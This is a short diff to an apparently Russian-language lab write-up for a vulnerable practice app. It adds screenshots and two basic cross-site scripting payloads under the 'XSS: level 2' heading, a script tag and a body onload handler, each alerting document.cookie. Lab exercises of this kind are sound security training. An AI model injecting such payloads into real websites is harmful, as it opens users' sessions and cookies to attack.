@@ -104,9 +104,18 @@ Command Execution: уровень 4
 
  ![image](https://github.com/user-attachments/assets/a200b3e2-622a-4419-8f5b-cb6420feaa74)
 
+ <script>alert(document.cookie)</script>
+![image](https://github.com/user-attachments/assets/62e43c79-285c-48cc-941f-9b8698606d7d)
+
 
 
  XSS: уровень 2
+
+ 
+<body onload=alert(document.cookie)>
+
+ ![image](https://github.com/user-attachments/assets/14402f74-d56c-4beb-a4fe-097906b96645)
+ 
 
 ![image](https://github.com/user-attachments/assets/8d07cb68-9225-41d2-88f3-4d6e0c68bc02)
 
